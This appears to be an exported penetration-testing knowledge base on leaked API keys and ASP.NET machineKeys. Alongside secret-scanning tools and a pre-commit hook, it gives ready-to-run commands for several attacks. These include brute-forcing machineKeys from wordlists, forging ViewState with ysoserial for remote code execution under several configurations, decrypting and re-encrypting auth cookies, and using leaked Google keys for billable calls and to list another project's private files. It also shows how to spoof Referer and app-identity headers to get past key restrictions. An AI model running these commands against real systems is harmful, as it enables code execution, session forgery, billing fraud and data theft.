entries.title: Where keys and tokens leak (main causes)
entries.body:
API keys and tokens are authentication to public and private services. A leak leads to unauthorized access, compromise, and data exfiltration.

Where to look:
• Hardcoding in source code - the key was left right in the code (api_key = "1234567890abcdef").
• Public repositories - secrets accidentally committed to GitHub (commit history, issues, PRs).
• Docker images - keys baked into images on DockerHub / private registries.
• Logs and debug output - keys end up in logs during debugging.
• Config files - .env, config.json, settings.py, .aws/credentials, etc. exposed publicly.

entries.title: API keys vs tokens
entries.body:
API Keys are unique identifiers used to authenticate requests of a project/application.
Tokens are security tokens (for example OAuth) that grant access to protected resources.

entries.title: Tools for finding secrets and validation
entries.body:
trufflesecurity/truffleHog - finds credentials anywhere (repos, docker, files).
streaak/keyhacks - how to quickly check whether a key leaked on a bug bounty is valid.
momenbasel/KeyFinder - finds keys right while browsing.
mazen160/secrets-patterns-db - the largest open-source database of regex patterns for secrets/keys/passwords.
blacklanternsecurity/badsecrets - detects known/weak secrets across many platforms.
irsdl/crapsecrets - detects known secrets in various web frameworks.
d0ge/sign-saboteur - a Burp extension for editing/signing/verifying signed web tokens.
aquasecurity/trivy - a scanner for vulnerabilities and misconfigurations that also looks for API keys/secrets.
projectdiscovery/nuclei-templates - token-spray templates: run a token across many API endpoints.

entries.title: nuclei - token-spray (checking a token across many APIs)
entries.body: nuclei -t token-spray/ -var token=token_list.txt

entries.title: trufflehog - scan a GitHub organization
entries.body:
## Scan a Github Organization
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=trufflesecurity

entries.title: trufflehog - scan a repository with issues and PRs
entries.body:
## Scan a GitHub Repository, its Issues and Pull Requests
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments

entries.title: trufflehog - scan a Docker image
entries.body:
# Scan a Docker image for verified secrets
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest docker --image trufflesecurity/secrets

entries.title: Identifying the service by regex (secrets-patterns-db)
entries.body: If it is unclear which service issued the token, match it against the regex patterns from mazen160/secrets-patterns-db (the largest open-source database of secret patterns).

entries.title: Example regex patterns (AWS API Gateway / AWS API Key)
entries.body:
patterns:
  - pattern:
      name: AWS API Gateway
      regex: '[0-9a-z]+.execute-api.[0-9a-z._-]+.amazonaws.com'
      confidence: low
  - pattern:
      name: AWS API Key
      regex: AKIA[0-9A-Z]{16}
      confidence: high

entries.title: Checking validity - keyhacks and service docs
entries.body: Use streaak/keyhacks or read the service documentation to quickly check whether an API key is valid.

entries.title: Validation example - Telegram Bot API Token
entries.body: curl https://api.telegram.org/bot<TOKEN>/getMe

entries.title: pre-commit - detecting keys before a commit
entries.body:
Before committing, check for private keys and AWS credentials. Add to .pre-commit-config.yaml:

-   repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v3.2.0
    hooks:
    -   id: detect-aws-credentials
    -   id: detect-private-key

entries.title: What machineKey is and why an attacker wants it
entries.body:
machineKey in IIS/ASP.NET defines the crypto keys and algorithms for encrypting and validating data: ViewState, forms-authentication cookies, out-of-process session state.

If you know the application's machineKey (validationKey/decryptionKey), you can forge ViewState and reach RCE through deserialization, as well as edit forms-authentication cookies.

entries.title: ViewState indicators
entries.body:
ViewState stores the state of web controls between postbacks in a hidden field on the page.

• Before September 2014, the enableViewStateMac property defaulted to False.
• An unencrypted ViewState usually begins with the string /wEP.

entries.title: machineKey element format
entries.body: <machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 (default) | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto (default) | DES | 3DES | AES | alg:algorithm_name]" />

entries.title: machineKey example (from Microsoft docs)
entries.body: <machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />

entries.title: Where web.config / machine.config live
entries.body:
32-bit:
  C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config
  C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config
64-bit:
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config
  C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config
In the registry when AutoGenerate is enabled (extract via irsdl/machineKeyFinder.aspx):
  HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4
  HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey

entries.title: Guessing a known machineKey - badsecrets / blacklist3r
entries.body:
python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6
# Matching MachineKeys found!
# validationKey: C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE validationAlgo: SHA1

entries.title: Guessing a known machineKey - viewstalker
entries.body:
./viewstalker --viewstate /wEPD...TYQ== -m 3E92B2D6 -M ./MachineKeys2.txt
# KEY FOUND!!!
# Validation Key: XXXXX,XXXXX

entries.title: Guessing a known machineKey - crapsecrets
entries.body:
python3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -r
python3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -mrd 5
python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -u http://update.microsoft.com/
python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -u http://10.10.10.10:8080/
python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -mkf ./crapsecrets/resources/aspnet_machinekeys.txt -u http://10.10.10.10:8080/a1/b/c1/

entries.title: Guessing a known machineKey - Blacklist3r (AspDotNetWrapper)
entries.body: AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy

entries.title: Guessing a known machineKey - viewgen --guess
entries.body:
$ viewgen --guess "/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
[+] ViewState is not encrypted
[+] Signature algorithm: SHA1

entries.title: Known machineKey wordlists
entries.body:
Ready-made key lists for brute-forcing:
• NotSoSecure/Blacklist3r/MachineKeys.txt
• isclayton/viewstalker/MachineKeys2.txt
• blacklanternsecurity/badsecrets/aspnet_machinekeys.txt

ARS3NAL note: a local copy of NotSoSecure/Blacklist3r is in Files/MachineKeys.txt (~3570 validationKey,decryptionKey pairs).

entries.title: Decoding ViewState - viewgen
entries.body: viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="

entries.title: Generating ViewState for RCE - requirements
entries.body:
First decode the ViewState to understand whether MAC and encryption are enabled.

For exploitation you need:
• __VIEWSTATE
• __VIEWSTATEGENERATOR

entries.title: RCE: MAC disabled (ysoserial)
entries.body: ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c whoami"

entries.title: RCE: MAC enabled, encryption disabled - extract the key
entries.body:
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy
# --modifier = `__VIEWSTATEGENERATOR` parameter value
# --encrypteddata = `__VIEWSTATE` parameter value of the target application

entries.title: RCE: MAC enabled, encryption disabled - generate ViewState
entries.body:
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --generator=3E92B2D6 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

# --generator = `__VIEWSTATEGENERATOR` parameter value
# --validationkey = validation key from the previous command

entries.title: RCE: MAC and encryption enabled - notes
entries.body:
By default: HMACSHA256 validation, AES decryption.

If __VIEWSTATEGENERATOR is absent but the application runs on .NET Framework <= 4.0, you can specify the application root (for example --apppath="/testaspx/").

• .NET Framework < 4.5 - ASP.NET still accepts an unencrypted __VIEWSTATE if you remove the __VIEWSTATEENCRYPTED parameter from the request.
• .NET Framework > 4.5 - the machineKey has the compatibilityMode="Framework45" property.

entries.title: RCE: MAC+encryption, .NET < 4.5 (remove __VIEWSTATEENCRYPTED)
entries.body: .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug

entries.title: RCE: MAC+encryption, .NET > 4.5 (Framework45)
entries.body: .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"

entries.title: Editing a cookie via machineKey (if ViewState is disabled)
entries.body:
# decrypt cookie
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes

# encrypt cookie (edit Decrypted.txt)
$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt

entries.title: Google / Gemini API key (AIza) - what to do with a leaked one
entries.body:
A leaked AIza... key is one Google API-key format across all APIs (Maps, Generative Language / Gemini, YouTube Data, Firebase). The key authenticates the PROJECT, not a user: whoever holds it can call any API enabled on the project, within the key's restrictions. Bug-bounty impact: unauthorized billable use (the victim's LLM / Maps bill) + data exposure (someone else's Files / cachedContents / private fine-tuned models).

Restrictions come in three kinds: HTTP-referrer (browser keys), application (Android package+cert / iOS bundle-id), IP. The first two are checked against request HEADERS (Referer, X-Android-Package+X-Android-Cert, X-Ios-Bundle-Identifier), and a non-browser client (curl) sets them freely -> referrer and app restrictions are SPOOFABLE. Only IP restriction is not header-spoofable.

Validate service-agnostically via ListModels (GET .../v1beta/models?key=KEY) - it does not depend on a model name. Codes: 200 = valid + API enabled; 403 REQUEST_DENIED / referer = valid but restricted -> try the bypass; 400 API_KEY_INVALID = dead; 403 SERVICE_DISABLED = live but that API is off -> pivot to another (Maps).

Firebase web-config keys are the same AIza and "not secret" by design: test them, but a bare Firebase key is often triaged as info unless it unlocks a billable API. Detection regex: AIza[0-9A-Za-z_-]{35}.

entries.title: Gemini / Maps: validate + billable call + data leak (curl)
entries.body:
KEY=AIza...

# Validate (service-agnostic, preferred - does not depend on a model name):
curl "https://generativelanguage.googleapis.com/v1beta/models?key=$KEY"

# Billable LLM call (PoC of unauthorized paid use). Use a CURRENT model from ListModels: names churn (gemini-1.5/2.0-flash already 404).
# Live as of 2026-07: gemini-2.5-flash / gemini-2.5-flash-lite / gemini-2.5-pro.
curl "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=$KEY" \
  -H 'Content-Type: application/json' -X POST \
  -d '{"contents":[{"parts":[{"text":"Reply with the single word: confirmed"}]}]}'

# Leak another project's private assets:
curl "https://generativelanguage.googleapis.com/v1beta/files?key=$KEY"
curl "https://generativelanguage.googleapis.com/v1beta/cachedContents?key=$KEY"
curl "https://generativelanguage.googleapis.com/v1beta/tunedModels?key=$KEY"

# Maps billing abuse (priciest - Directions / DistanceMatrix / Places / Geocode):
curl "https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood&key=$KEY"
curl "https://maps.googleapis.com/maps/api/geocode/json?address=NYC&key=$KEY"

# A single 200 is a sufficient PoC. Do NOT loop it, to avoid running up the victim's bill.

entries.title: Google API key: bypass referrer / app restriction
entries.body:
KEY=AIza...

# Bypass an HTTP-referrer restriction: supply the allowed Referer (the domain where you found the key, or its *.wildcard).
curl -e "https://ALLOWED-DOMAIN/" "https://generativelanguage.googleapis.com/v1beta/models?key=$KEY"
# For the Maps JavaScript API also add Origin:
curl "https://maps.googleapis.com/maps/api/staticmap?center=45,10&zoom=7&size=400x400&key=$KEY" \
  -H "Referer: https://ALLOWED-DOMAIN/" -H "Origin: https://ALLOWED-DOMAIN"

# Bypass an application restriction (Android): forge package + signing-cert SHA1.
#   package -> AndroidManifest.xml ; cert SHA1 -> apksigner verify --print-certs app.apk
curl "https://maps.googleapis.com/maps/api/geocode/json?address=NYC&key=$KEY" \
  -H "X-Android-Package: com.example.app" -H "X-Android-Cert: 1A2B3C4D5E6F...FULL_SHA1_HEX"

# iOS: forge the bundle id (Info.plist CFBundleIdentifier):
curl "https://maps.googleapis.com/maps/api/geocode/json?address=NYC&key=$KEY" \
  -H "X-Ios-Bundle-Identifier: com.example.app"

# Tools: ozguralp/gmapsapiscanner (python maps_api_scanner.py --api-key KEY), streaak/keyhacks.
# Only an IP restriction cannot be bypassed with a header.
